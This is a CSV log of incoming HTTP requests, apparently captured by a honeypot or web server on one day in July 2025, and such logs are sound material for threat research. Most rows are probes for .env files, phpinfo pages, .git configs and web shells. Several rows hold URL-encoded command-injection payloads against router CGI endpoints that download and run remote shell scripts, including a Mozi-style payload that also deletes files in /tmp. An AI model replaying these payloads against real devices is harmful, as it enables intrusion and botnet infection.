"2025-07-26","45.135.232.205","Russia","HTTP","/_layouts/15/ToolPane.aspx?DisplayMode=Edit"
"2025-07-26","78.153.140.179","United Kingdom","HTTP","/app_dev.php/_profiler/phpinfo"
"2025-07-26","78.153.140.179","United Kingdom","HTTP","/?phpinfo=-1"
"2025-07-26","78.153.140.179","United Kingdom","HTTP","/?url=.env"
"2025-07-26","78.153.140.179","United Kingdom","HTTP","/staging/.env"
"2025-07-26","78.153.140.179","United Kingdom","HTTP","/app_dev.php/_profiler/open?file=app/config/parameters.yml"
"2025-07-26","78.153.140.179","United Kingdom","HTTP","/phpinfo.php"
"2025-07-26","78.153.140.179","United Kingdom","HTTP","/info/"
"2025-07-26","78.153.140.179","United Kingdom","HTTP","/app/.env"
"2025-07-26","78.153.140.179","United Kingdom","HTTP","/phpinfo/"
"2025-07-26","78.153.140.179","United Kingdom","HTTP","/dev/.env"
"2025-07-26","78.153.140.179","United Kingdom","HTTP","/.env.production"
"2025-07-26","78.153.140.179","United Kingdom","HTTP","/.env.save"
"2025-07-26","78.153.140.179","United Kingdom","HTTP","/demo/.env"
"2025-07-26","78.153.140.179","United Kingdom","HTTP","/?url=.env"
"2025-07-26","78.153.140.179","United Kingdom","HTTP","/staging/.env"
"2025-07-26","78.153.140.179","United Kingdom","HTTP","/app_dev.php/_profiler/open?file=app/config/parameters.yml"
"2025-07-26","78.153.140.179","United Kingdom","HTTP","/phpinfo.php"
"2025-07-26","78.153.140.179","United Kingdom","HTTP","/info/"
"2025-07-26","78.153.140.179","United Kingdom","HTTP","/app/.env"
"2025-07-26","78.153.140.179","United Kingdom","HTTP","/phpinfo/"
"2025-07-26","78.153.140.179","United Kingdom","HTTP","/dev/.env"
"2025-07-26","78.153.140.179","United Kingdom","HTTP","/.env.production"
"2025-07-26","78.153.140.179","United Kingdom","HTTP","/.env.save"
"2025-07-26","78.153.140.179","United Kingdom","HTTP","/demo/.env"
"2025-07-26","78.153.140.179","United Kingdom","HTTP","/.env.testing"
"2025-07-26","45.135.194.11","The Netherlands","HTTP","/GponForm/diag_Form?images/"
"2025-07-26","45.135.194.11","The Netherlands","HTTP","/cgi-bin/shortcut_telnet.cgi?wget%20-qO-%20http%3A%2F%2F192.183.232.142%2Frondo.wyu.sh%7Csh%3B"
"2025-07-26","45.135.194.11","The Netherlands","HTTP","/setup.cgi?next_file=netgear.cfg\u0026todo=syscmd\u0026cmd=busybox%20wget%20-qO-%20http%3A%2F%2F192.183.232.142%2Frondo.ush.sh%7Csh%3B\u0026curpath=%2F\u0026currentsetting.htm=1"
"2025-07-26","45.135.194.11","The Netherlands","HTTP","/cgi-bin/server/server.cgi?func=server02_main_submit\u0026counter=5.22497857400916\u0026TEST_BTN4="
"2025-07-26","45.135.194.11","The Netherlands","HTTP","/cgi-bin/cgi_main.cgi"
"2025-07-26","45.135.194.11","The Netherlands","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=%24%28wget%20-qO-%20http%3A%2F%2F192.183.232.142%2Frondo.zqq.sh%7Csh%29"
"2025-07-26","45.135.194.11","The Netherlands","HTTP","/editBlackAndWhiteList"
"2025-07-26","45.135.194.11","The Netherlands","HTTP","/public/template.cgi?templatefile=%24%28wget%20-qO-%20http%3A%2F%2F192.183.232.142%2Frondo.xbm.sh%7Csh%3B%29"
"2025-07-26","45.135.194.11","The Netherlands","HTTP","/cgi-bin/cstecgi.cgi"
"2025-07-26","45.135.194.11","The Netherlands","HTTP","/cgi-bin/account_mgr.cgi?cmd=cgi_user_add\u0026name=%27%3Bwget%20-qO-%20http%3A%2F%2F192.183.232.142%2Frondo.djc.sh%7Csh%3B%27"
"2025-07-26","45.135.194.11","The Netherlands","HTTP","/setup.cgi?todo=funjsq_login\u0026funjsq_access_token=12345|busybox%20wget%20-qO-%20http%3A%2F%2F192.183.232.142%2Frondo.fep.sh%7Csh%0A\u0026test=11%00currentsetting.htm"
"2025-07-26","45.135.194.11","The Netherlands","HTTP","/goform/mp"
"2025-07-26","176.65.148.99","The Netherlands","HTTP","/login"
"2025-07-26","79.124.58.198","Bulgaria","HTTP","/?XDEBUG_SESSION_START=phpstorm"
"2025-07-26","128.14.225.253","United States","HTTP","/favicon.ico"
"2025-07-26","128.14.225.253","United States","HTTP","/robots.txt"
"2025-07-26","128.14.225.253","United States","HTTP","/sitemap.xml"
"2025-07-26","128.14.225.253","United States","HTTP","/config.json"
"2025-07-26","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-07-26","65.49.1.191","United States","HTTP","http://api.ipify.org/?format=json"
"2025-07-26","65.49.1.182","United States","HTTP","/geoserver/web/"
"2025-07-26","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-07-26","205.210.31.83","United States","HTTP","/shell.php"
"2025-07-26","198.235.24.75","United States","HTTP","/webshell.php"
"2025-07-26","147.185.132.195","United States","HTTP","/shell"
"2025-07-26","159.223.67.231","Singapore","HTTP","/download/powershell/"
"2025-07-26","159.223.67.231","Singapore","HTTP","/get.php"
"2025-07-26","198.235.24.65","United States","HTTP","/webshell"
"2025-07-26","143.244.186.186","United States","HTTP","/.env"
"2025-07-26","143.244.186.186","United States","HTTP","/.git/config"
"2025-07-26","207.167.67.206","United States","HTTP","http://example.com/"
"2025-07-26","207.167.67.206","United States","HTTP","http://example.com/"
"2025-07-26","79.124.58.198","Bulgaria","HTTP","/actuator/gateway/routes"
"2025-07-26","138.197.16.14","United States","HTTP","/api/client/update?arch=amd64\u0026commit=08059e95dacafe0bf6e5782f8e2c8ec9cd8c5a17\u0026os=windows"
"2025-07-26","152.42.196.197","Singapore","HTTP","/form.html"
"2025-07-26","152.42.196.197","Singapore","HTTP","/upl.php"
"2025-07-26","152.42.196.197","Singapore","HTTP","/t4"
"2025-07-26","152.42.196.197","Singapore","HTTP","/geoip/"
"2025-07-26","152.42.196.197","Singapore","HTTP","/favicon.ico"
"2025-07-26","152.42.196.197","Singapore","HTTP","/1.php"
"2025-07-26","152.42.196.197","Singapore","HTTP","/systembc/password.php"
"2025-07-26","152.42.196.197","Singapore","HTTP","/password.php"
"2025-07-26","149.86.227.127","Poland","HTTP","/boaform/form_loid_burning"
"2025-07-26","185.100.87.136","Romania","HTTP","/index.htm"
"2025-07-26","185.100.87.136","Romania","HTTP","/FD873AC4-CF86-4FED-84EC-4BD59C6F17A7"
"2025-07-26","91.230.168.2","United States","HTTP","/favicon.ico"
"2025-07-26","164.52.0.91","Japan","HTTP","/favicon.ico"
"2025-07-26","164.52.0.91","Japan","HTTP","/favicon.ico"
"2025-07-26","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-07-26","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-07-26","91.196.152.91","France","HTTP","/favicon.ico"
"2025-07-26","141.76.94.18","Germany","HTTP","http://141.76.94.18:80/pscan"
"2025-07-26","207.167.67.206","United States","HTTP","http://example.com/"
"2025-07-26","207.167.67.206","United States","HTTP","http://example.com/"
"2025-07-26","149.86.227.127","Poland","HTTP","/boaform/form_loid_burning"
"2025-07-26","120.85.117.26","China","HTTP","/setup.cgi?next_file=netgear.cfg\u0026todo=syscmd\u0026cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear\u0026curpath=/\u0026currentsetting.htm=1"
"2025-07-26","87.255.194.135","Kazakhstan","HTTP","/admin/assets/css/jquery-ui.css"
"2025-07-26","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-07-26","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-07-26","206.168.34.120","United States","HTTP","/favicon.ico"
"2025-07-26","206.168.34.120","United States","HTTP","/wiki"
"2025-07-26","207.167.67.206","United States","HTTP","http://example.com/"
"2025-07-26","207.167.67.206","United States","HTTP","http://example.com/"
"2025-07-26","45.135.193.2","The Netherlands","HTTP","/manager/html"
"2025-07-26","149.86.227.127","Poland","HTTP","/boaform/form_loid_burning"
"2025-07-26","207.167.67.206","United States","HTTP","http://example.com/"
"2025-07-26","207.167.67.206","United States","HTTP","http://example.com/"
"2025-07-26","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-07-26","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-07-26","149.86.227.127","Poland","HTTP","/boaform/form_loid_burning"
